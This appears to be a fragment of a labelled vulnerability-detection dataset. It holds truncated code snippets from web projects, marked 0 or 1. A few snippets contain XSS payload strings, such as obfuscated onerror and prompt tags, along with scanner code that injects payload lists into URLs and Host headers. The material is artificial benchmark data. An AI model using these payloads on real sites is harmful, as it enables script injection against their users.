payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode", "label": 0}, {"snippet_id": 43266, "code": ".CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self", "label": 0}, {"snippet_id": 35083, "code": " `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif", "label": 0}, {"snippet_id": 5411, "code": "'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', ", "label": 0}, {"snippet_id": 17734, "code": "'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done", "label": 0}, {"snippet_id": 19553, "code": " cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test", "label": 0}, {"snippet_id": 11372, "code": ".__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course", "label": 0}, {"snippet_id": 40973, "code": " \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate", "label": 0}, {"snippet_id": 36680, "code": " tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context", "label": 0}, {"snippet_id": 11666, "code": "'auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete", "label": 0}, {"snippet_id": 25999, "code": "('Street and Number')}), 'beneficiary': forms.Textarea(attrs={'rows': 3}), 'company': forms.TextInput(attrs={'data-display-dependency': ' 'vat_id': forms.TextInput(attrs={'data-display-dependency': ' 'internal_reference", "label": 0}, {"snippet_id": 46950, "code": ".post_id==self.id: await c.delete() return True return False @property @cache(MC_KEY_COMMENT_LIST %('{self.id}')) async def comments(self): return await Comment.sync_filter(post_id=self.id, orderings=['", "label": 0}, {"snippet_id": 31524, "code": ")\t \tservers=sql.select_waf_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_waf_metrics(serv) \t\tmetrics={} \t\t \t\tfor i", "label": 0}, {"snippet_id": 45003, "code": "' % params_form.errors)) else: parameters=workflow.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet", "label": 0}, {"snippet_id": 36509, "code": "], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval", "label": 0}, {"snippet_id": 16131, "code": ".views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name", "label": 0}, {"snippet_id": 4649, "code": "'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', ", "label": 0}, {"snippet_id": 11525, "code": "\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request", "label": 0}, {"snippet_id": 35913, "code": " \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value", "label": 0}, {"snippet_id": 24148, "code": " run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ", "label": 0}, {"snippet_id": 38880, "code": "\t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self,", "label": 0}, {"snippet_id": 10385, "code": " to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200", "label": 0}, {"snippet_id": 30210, "code": "\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page')) \t if act==\"overviewServers\": \tovw.get_overviewServers() \t if form.getvalue('action'): \timport requests \tfrom requests_toolbelt.utils import dump \t", "label": 0}, {"snippet_id": 183, "code": "\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request", "label": 0}, {"snippet_id": 48219, "code": ".FILES.getlist('files') user: Profile=get_current_user(request) for f in files: handle_file(user, str(f.name), category, \" except Exception as e: return redirect(\"/admin/media/add?hint=\" +str(e)) return", "label": 0}, {"snippet_id": 52810, "code": "([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action", "label": 0}, {"snippet_id": 36537, "code": ")): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse", "label": 0}, {"snippet_id": 37626, "code": "}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger", "label": 0}, {"snippet_id": 38463, "code": " default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes", "label": 0}, {"snippet_id": 40450, "code": " default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not", "label": 0}, {"snippet_id": 50004, "code": " from evennia.utils.text2html import parse_html from evennia.server import session _CLIENT_SESSIONS=utils.mod_import(settings.SESSION_ENGINE).SessionStore _RE_SCREENREADER_REGEX=re.compile(r\"%s\" % settings", "label": 0}, {"snippet_id": 39845, "code": "\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name", "label": 0}, {"snippet_id": 53613, "code": "['coordinator'] for b in bundle.data['coordinators']])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all", "label": 0}, {"snippet_id": 23835, "code": ", test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('',", "label": 0}, {"snippet_id": 17345, "code": "<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid", "label": 0}, {"snippet_id": 4915, "code": "(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x", "label": 0}, {"snippet_id": 6286, "code": ", 'debug') @property def syslog_debug(self): \"\"\" Set to True to log debug messages to syslog(also requires syslog_socket)(boolean). \"\"\" return self.config.getboolean(self.section, 'syslog_debug') @property", "label": 0}, {"snippet_id": 48681, "code": ": return HttpResponseRedirect(\"/admin?error=noyb\") response: HttpResponseRedirect=HttpResponseRedirect(forward_url +\"?rid=\" +str(r.id)) return response def action_delete_article(request: HttpRequest): ", "label": 0}, {"snippet_id": 17254, "code": ".submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 35246, "code": "\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _", "label": 0}, {"snippet_id": 48660, "code": " request.POST.get(\"notes\"): r.notes=request.POST[\"notes\"] if request.POST.get(\"contact\"): r.responsiblePerson=str(request.POST[\"contact\"]) if(r.createdByUser==u or o.rights > 1) and not r.submitted: r.save()", "label": 1}, {"snippet_id": 49461, "code": ".title return super(SmartFilter, self).get_title() def get_values(self): values=[] if isinstance(self.model_field, SmartListFilter): values=[ SmartFilterValue(self.model_field.parameter_name, choice[1]", "label": 0}, {"snippet_id": 35175, "code": "(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint", "label": 0}, {"snippet_id": 5277, "code": "'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head", "label": 0}, {"snippet_id": 31433, "code": "[serv].y_range.end=int(df['curr_con'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t\t\t \t\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5, color=' \t\tp[serv].line(", "label": 0}, {"snippet_id": 7700, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware", "label": 1}, {"snippet_id": 43971, "code": " exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval", "label": 0}, {"snippet_id": 19244, "code": "/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec", "label": 0}, {"snippet_id": 24770, "code": " import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store", "label": 0}, {"snippet_id": 24229, "code": "\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError", "label": 0}, {"snippet_id": 54258, "code": "'light sky blue').grid(row=10) ua=[\"\"] ua+=bane.ua li=bane.read_file('xss.txt') pl=[] for x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global target target=Entry(main) target.insert(0,'http", "label": 1}, {"snippet_id": 29075, "code": "%s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t \tif kwargs.get('syn_flood')==\"1\": \t\tsyn_flood_protect(serv) \t def syn_flood_protect(serv, **kwargs): \timport sql \tscript=\"syn_flood_protect.sh", "label": 0}, {"snippet_id": 12685, "code": ">[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url", "label": 0}, {"snippet_id": 17586, "code": ") urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard", "label": 0}, {"snippet_id": 28651, "code": "'uuid') \tref=os.environ.get(\"SCRIPT_NAME\") \tsql.delete_old_uuid() \t \tif user_uuid is not None: \t\tsql.update_last_act_user(user_uuid.value) \t\tif sql.get_user_name_by_uuid(user_uuid.value) is None: \t\t\tprint", "label": 0}, {"snippet_id": 4171, "code": ".replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1", "label": 0}, {"snippet_id": 34197, "code": "\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t", "label": 0}, {"snippet_id": 27419, "code": " display.\"\"\" return '{t.day}{t:%b}{t:%y}{t:%X} PDT'.format(t=dt) def splitlines(text): \"\"\"Split text into lines.\"\"\" return text.splitlines() def split_br(text): return re.split(r'\\s*<br */>\\s*', text, flags", "label": 0}, {"snippet_id": 25023, "code": "(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self)", "label": 0}, {"snippet_id": 43782, "code": ".print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from", "label": 0}, {"snippet_id": 18369, "code": "\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware", "label": 0}, {"snippet_id": 7651, "code": ".views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 1}, {"snippet_id": 42964, "code": "'.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable", "label": 0}, {"snippet_id": 47271, "code": "=rec_uuid) with app.test_client() as client: res=client.get(index_view_url) assert res.status_code==200 with patch('invenio_records.models.RecordMetadata') as db_mock: db_mock.side_effect=SQLAlchemyError", "label": 0}, {"snippet_id": 37109, "code": " `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len", "label": 0}, {"snippet_id": 39635, "code": "\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t", "label": 0}, {"snippet_id": 13463, "code": " if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create", "label": 0}, {"snippet_id": 22663, "code": ", url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch", "label": 0}, {"snippet_id": 21033, "code": "),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import", "label": 0}, {"snippet_id": 2605, "code": " temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header", "label": 0}, {"snippet_id": 42797, "code": "'' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields", "label": 0}, {"snippet_id": 42882, "code": ".get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t", "label": 0}, {"snippet_id": 33762, "code": " under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\")", "label": 0}, {"snippet_id": 36806, "code": " \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context", "label": 0}, {"snippet_id": 11731, "code": "'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$", "label": 0}, {"snippet_id": 17701, "code": ".views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),", "label": 0}, {"snippet_id": 40680, "code": ".print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self", "label": 0}, {"snippet_id": 34952, "code": " database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict", "label": 0}, {"snippet_id": 11773, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +", "label": 0}, {"snippet_id": 43920, "code": " _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t", "label": 0}, {"snippet_id": 5893, "code": "=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus", "label": 0}, {"snippet_id": 6298, "code": " requires syslog_socket)(boolean). \"\"\" return self.config.getboolean(self.section, 'syslog_debug') @property def listen_addr(self): \"\"\" IP address to listen on. \"\"\" return self.config.get(self.section,", "label": 0}, {"snippet_id": 28270, "code": "\t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save) \t\t \tstderr=funct.upload_and_restart(serv, cfg, just_save=save) \t\t \tfunct.diff_config(oldcfg, cfg) \t \t \t \t \t \t\t \tos.system(\"/bin/rm -f \" +hap_configs_dir", "label": 0}, {"snippet_id": 33917, "code": ".append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append", "label": 0}, {"snippet_id": 18000, "code": " key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED", "label": 0}, {"snippet_id": 7987, "code": "', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort", "label": 0}, {"snippet_id": 3866, "code": " parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode", "label": 0}, {"snippet_id": 35064, "code": "\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where", "label": 0}, {"snippet_id": 27798, "code": "(exception, helpers.EarlyExitException): status=exception.status values=exception.to_dict() values['params']=self.request.params.dict_of_lists() if status >=400 and status <=499: logging.info(json.dumps(values,", "label": 0}, {"snippet_id": 16803, "code": "<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter", "label": 1}, {"snippet_id": 38, "code": ": path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application", "label": 1}, {"snippet_id": 2925, "code": "=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url)", "label": 0}, {"snippet_id": 41316, "code": "=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): ", "label": 0}, {"snippet_id": 17952, "code": ".render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'),", "label": 0}, {"snippet_id": 25401, "code": ".scheme_name for i, value in enumerate(data_list): data[self.scheme['fields'][i][0]]=value or '' return data def __init__(self, *args, **kwargs): fields=[] defaults={ 'widget': self.widget, 'max_length': kwargs", "label": 0}, {"snippet_id": 38724, "code": " isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue", "label": 0}, {"snippet_id": 29109, "code": ") \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" \"+enable] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm -f %s\"", "label": 0}, {"snippet_id": 275, "code": "=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line", "label": 0}, {"snippet_id": 19617, "code": " '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls", "label": 0}, {"snippet_id": 10789, "code": "=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args", "label": 1}, {"snippet_id": 41639, "code": "\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t", "label": 0}, {"snippet_id": 21528, "code": ">[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$", "label": 0}, {"snippet_id": 26920, "code": "[params[j]]=xss else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params[hidden_param_name", "label": 0}, {"snippet_id": 47934, "code": "=mail, password=pw1) auth_user.save() user: Profile=Profile() user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) user.displayName=displayname user.authuser", "label": 1}, {"snippet_id": 29166, "code": "+script +\" PROXY=\" +proxy+ \t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm -f %s\" % script) \t \tstderr", "label": 0}, {"snippet_id": 33573, "code": " tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context", "label": 0}, {"snippet_id": 42393, "code": "() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self", "label": 0}, {"snippet_id": 6872, "code": " default_scoped_affiliation(self): \"\"\" Add a default eduPersonScopedAffiliation if none is returned from the attribute manager. \"\"\" return self.config.get(self.section, 'default_scoped_affiliation') @property", "label": 0}, {"snippet_id": 52748, "code": ".objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param", "label": 0}, {"snippet_id": 16073, "code": "', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$", "label": 0}, {"snippet_id": 54308, "code": ".current(14) global user_agent user_agent=ttk.Combobox(main, values=ua) user_agent.current(1) global payload payload=ttk.Combobox(main, values=pl) payload.current(0) global proxy proxy=ttk.Combobox(main,", "label": 0}, {"snippet_id": 45994, "code": "\"id\":\"14023aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"}, ] def index", "label": 0}, {"snippet_id": 34369, "code": " _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t", "label": 0}, {"snippet_id": 18944, "code": "'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(", "label": 0}, {"snippet_id": 29390, "code": "\terror +=ssh_command(serv, commands) \texcept Exception as e: \t\terror +=e \tif error: \t\treturn error \t\t def open_port_firewalld(cfg): \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert", "label": 0}, {"snippet_id": 7737, "code": "[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware", "label": 0}, {"snippet_id": 53655, "code": "=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir 